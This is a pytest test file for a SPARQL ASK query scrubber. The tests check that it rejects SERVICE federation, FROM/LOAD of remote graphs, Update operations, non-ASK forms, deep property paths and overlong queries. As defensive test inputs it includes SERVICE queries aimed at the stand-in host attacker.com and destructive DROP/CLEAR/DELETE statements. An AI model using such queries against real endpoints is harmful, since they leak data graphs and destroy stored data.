"""Tests for the SPARQL ASK security scrubber.

The scrubber is the load-bearing protection against author-supplied
SPARQL ASK queries that would otherwise let an attacker:

- Exfiltrate data via the ``SERVICE`` federation clause.
- Pull arbitrary remote graphs via ``LOAD`` / ``FROM`` / ``FROM NAMED``.
- Mutate state via Update operations (``INSERT``, ``DELETE``, ``CLEAR``,
  ``DROP``, ``ADD``, ``MOVE``, ``COPY``).
- Run non-ASK forms whose result-shape semantics V1 does not support
  (``SELECT``, ``CONSTRUCT``, ``DESCRIBE``).
- Burn compute via deeply nested property paths.
- Burn compute via pathologically long queries.

Each test below maps to one of the V1 hardenings enumerated in
ADR-2026-05-18 "Security" → "SPARQL AST scrubbing". When new attack
patterns are reported in the wild, add a regression test here first
and extend ``_FORBIDDEN_ALGEBRA_NODES`` or the scrubber's pre-checks
to cover them.

The tests do not need Django; they exercise pure-function behaviour
inside ``sparql_security``.
"""

from __future__ import annotations

import pytest

from validibot.validations.validators.shacl.sparql_security import (
    DEFAULT_MAX_PROPERTY_PATH_DEPTH,
)
from validibot.validations.validators.shacl.sparql_security import (
    DEFAULT_MAX_QUERY_LENGTH,
)
from validibot.validations.validators.shacl.sparql_security import ScrubLimits
from validibot.validations.validators.shacl.sparql_security import SparqlScrubError
from validibot.validations.validators.shacl.sparql_security import scrub_sparql_ask

# ── ASK form acceptance ────────────────────────────────────────────────
#
# The happy path: a query that is genuinely a SPARQL ASK against the
# local graph must pass. If this breaks, every legitimate author query
# is broken — a regression here is more serious than the scrubber
# letting an attacker query through.


class TestAskAcceptance:
    """The scrubber must not reject queries that are actually safe."""

    def test_simple_ask_with_triple_pattern_passes(self):
        """The minimal legal ASK query — a triple pattern only.

        If this fails the scrubber has broken the trivial case and no
        author can persist any assertion at all.
        """
        scrub_sparql_ask("ASK { ?s ?p ?o }")

    def test_ask_with_filter_not_exists_passes(self):
        """``FILTER NOT EXISTS`` is the canonical 'every X has Y' pattern.

        Most author-written ASKs follow this shape. The scrubber must
        recognise it as legitimate even though it nests a graph pattern
        inside a filter.
        """
        scrub_sparql_ask(
            "ASK { ?s a ?type . FILTER NOT EXISTS { ?s ?p ?o } }",
        )

    def test_ask_with_short_property_path_passes(self):
        """Property paths up to the depth cap are allowed.

        ``rdfs:subClassOf*`` is widely used in legitimate ontology
        questions. The cap exists to bound nested paths; a single
        path operator must remain free.
        """
        scrub_sparql_ask(
            "PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n"
            "ASK { ?s rdfs:subClassOf* ?o }",
        )


# ── Non-ASK forms rejected ────────────────────────────────────────────
#
# V1 commits to ASK-only at the surface layer. SELECT / CONSTRUCT /
# DESCRIBE are reserved for a future named-SELECT-output design.
# Authors who want them must wait until that ADR ships and the
# scrubber is widened deliberately.


class TestNonAskFormsRejected:
    """SELECT, CONSTRUCT, DESCRIBE must all be refused at parse time."""

    def test_select_rejected(self):
        """SELECT reserved for a future named-output design is rejected.

        Until the result-shape inference question is resolved, accepting
        SELECT silently would either crash at evaluation or produce
        invented Validibot-specific output semantics.
        """
        with pytest.raises(SparqlScrubError, match="SelectQuery"):
            scrub_sparql_ask("SELECT * WHERE { ?s ?p ?o }")

    def test_construct_rejected(self):
        """CONSTRUCT produces a graph, not a boolean — never a useful gate.

        Even if we accepted it, the engine has no plumbing to turn its
        output into a workflow gate. Rejection prevents author surprise.
        """
        with pytest.raises(SparqlScrubError, match="ConstructQuery"):
            scrub_sparql_ask("CONSTRUCT { ?s ?p ?o } WHERE { ?s ?p ?o }")

    def test_describe_rejected(self):
        """DESCRIBE produces a node-set description — same rationale as CONSTRUCT."""
        with pytest.raises(SparqlScrubError, match="DescribeQuery"):
            scrub_sparql_ask("DESCRIBE <http://example.com/Thing>")


# ── Update operations rejected ────────────────────────────────────────
#
# Update operations belong to the SPARQL 1.1 Update grammar, parsed by
# ``parseUpdate`` rather than ``parseQuery``. ``parseQuery`` refuses
# them with a ParseException — we surface that as a friendly scrub
# error rather than a stack trace. If rdflib ever widens parseQuery
# to admit Update operations, the algebra-node check is the second
# line of defence.


class TestUpdateOperationsRejected:
    """SPARQL Update grammar is rejected even at the parser stage."""

    @pytest.mark.parametrize(
        "query",
        [
            "INSERT DATA { <a> <b> <c> }",
            "DELETE DATA { <a> <b> <c> }",
            "LOAD <http://x.com/g>",
            "CLEAR DEFAULT",
            "DROP GRAPH <http://x.com/g>",
            "CREATE GRAPH <http://x.com/g>",
            "ADD <http://x.com/a> TO <http://x.com/b>",
            "MOVE <http://x.com/a> TO <http://x.com/b>",
            "COPY <http://x.com/a> TO <http://x.com/b>",
        ],
    )
    def test_every_update_form_rejected(self, query):
        """Every form of SPARQL Update is rejected before persistence.

        Each one would let an author mutate the data or results graph
        between SHACL and CEL evaluation, breaking the invariant that
        the assertion layer is read-only. Tested as a parametrize to
        catch a future rdflib parser widening that accidentally lets
        any one of them through.
        """
        with pytest.raises(SparqlScrubError):
            scrub_sparql_ask(query)


# ── SERVICE federation rejected ───────────────────────────────────────
#
# The canonical exfiltration vector. SERVICE federates a SPARQL query
# to a remote endpoint, sending bindings from the local graph to the
# attacker's URL. Even an empty SERVICE block leaks the fact that the
# workflow ran. This must always be rejected with an explanatory
# message, since the rejection is the only thing standing between
# Validibot and "we just leaked your data graph to attacker.com".


class TestServiceClauseRejected:
    """SERVICE federation is unconditionally refused."""

    def test_service_at_top_level_rejected(self):
        """A SERVICE clause anywhere in the algebra tree is refused."""
        with pytest.raises(SparqlScrubError, match="SERVICE"):
            scrub_sparql_ask(
                "ASK { SERVICE <http://attacker.com/> { ?s ?p ?o } }",
            )

    def test_service_with_silent_keyword_rejected(self):
        """``SERVICE SILENT`` suppresses errors but still federates — refused."""
        with pytest.raises(SparqlScrubError, match="SERVICE"):
            scrub_sparql_ask(
                "ASK { SERVICE SILENT <http://attacker.com/> { ?s ?p ?o } }",
            )


# ── FROM / FROM NAMED rejected ────────────────────────────────────────
#
# FROM and FROM NAMED tell the SPARQL engine to load a remote graph
# before evaluation. We allow only the engine-supplied data / results
# / union graphs; anything else would be an out-of-band graph the
# author or attacker controls. The scrubber must distinguish "no
# datasetClause" (legal) from "datasetClause is present" (refused) —
# rdflib's CompValue.get() returns the key name as a fallback default,
# which would have produced a false positive without explicit type
# checks. This test guards against that regression.


class TestFromRejected:
    """FROM / FROM NAMED are refused at parse time."""

    def test_from_default_graph_iri_rejected(self):
        """An explicit FROM with a non-default IRI is refused."""
        with pytest.raises(SparqlScrubError, match="FROM"):
            scrub_sparql_ask("ASK FROM <http://x.com/g> { ?s ?p ?o }")

    def test_from_named_iri_rejected(self):
        """FROM NAMED with a custom IRI follows the same policy."""
        with pytest.raises(SparqlScrubError, match="FROM"):
            scrub_sparql_ask("ASK FROM NAMED <http://x.com/g> { ?s ?p ?o }")

    def test_query_without_from_passes(self):
        """A query with no datasetClause must not trigger the FROM check.

        Regression guard: rdflib's ``CompValue.get('datasetClause')``
        returns the string ``'datasetClause'`` (the key name as a
        fallback) when the key is missing, which previously caused a
        false positive. The scrubber must check for an actual list.
        """
        scrub_sparql_ask("ASK { ?s ?p ?o }")


# ── Property-path depth cap ──────────────────────────────────────────
#
# Deeply nested property paths can produce cubic-time evaluation on
# attacker-crafted hierarchies. The depth cap is conservative; most
# legitimate paths are one or two deep.


class TestPropertyPathDepth:
    """Property path nesting is bounded by the configurable cap."""

    def test_path_within_cap_passes(self):
        """A two-level nested path stays under the default cap of 8."""
        scrub_sparql_ask(
            "PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n"
            "ASK { ?s (rdfs:subClassOf/rdfs:subClassOf)* ?o }",
        )

    def test_path_exceeding_cap_rejected(self):
        """A path nested past the cap raises with a clear message.

        Uses a small override so we don't need a pathological test
        query. The configured cap is 1 here; any nested path triggers.
        """
        limits = ScrubLimits(
            max_query_length=DEFAULT_MAX_QUERY_LENGTH,
            max_property_path_depth=1,
        )
        with pytest.raises(SparqlScrubError, match="property path"):
            scrub_sparql_ask(
                "PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n"
                "ASK { ?s (rdfs:subClassOf/rdfs:subClassOf/rdfs:subClassOf)* ?o }",
                limits=limits,
            )


# ── Query-length cap ─────────────────────────────────────────────────
#
# A blunt but effective stopgap for pathologically large queries that
# would themselves DoS the parser. The cap is high enough that no
# realistic author query approaches it.


class TestQueryLengthCap:
    """Total query length is bounded."""

    def test_short_query_passes(self):
        """A normal-length query is unaffected by the length cap."""
        scrub_sparql_ask("ASK { ?s ?p ?o }")

    def test_overlength_query_rejected_before_parse(self):
        """A query past the cap is refused with the length-cap message.

        Cap is enforced before parsing so an attacker cannot DoS the
        parser itself with a 100 MB query body.
        """
        limits = ScrubLimits(
            max_query_length=100,
            max_property_path_depth=DEFAULT_MAX_PROPERTY_PATH_DEPTH,
        )
        long_q = "ASK { " + "?s ?p ?o . " * 200 + " }"
        with pytest.raises(SparqlScrubError, match="length"):
            scrub_sparql_ask(long_q, limits=limits)


# ── Empty / malformed input ──────────────────────────────────────────
#
# Empty input from the textarea, or a syntactically broken query,
# must produce a clear scrub error rather than a stack trace.


class TestMalformedInput:
    """Empty or syntactically invalid input is rejected clearly."""

    def test_empty_string_rejected(self):
        """An empty assertion is meaningless and refused with a clear message."""
        with pytest.raises(SparqlScrubError, match="empty"):
            scrub_sparql_ask("")

    def test_whitespace_only_rejected(self):
        """Whitespace-only input is treated the same as empty."""
        with pytest.raises(SparqlScrubError, match="empty"):
            scrub_sparql_ask("   \n\n  \t  ")

    def test_syntax_error_surfaced(self):
        """A broken query is rejected with a syntax-error message.

        The author needs to know whether to fix syntax or restructure
        the query semantically; the error class is exposed for that
        purpose, while exception detail is not (sanitised in the
        SparqlScrubError message).
        """
        with pytest.raises(SparqlScrubError, match="syntax"):
            scrub_sparql_ask("ASK { this is not valid sparql }")
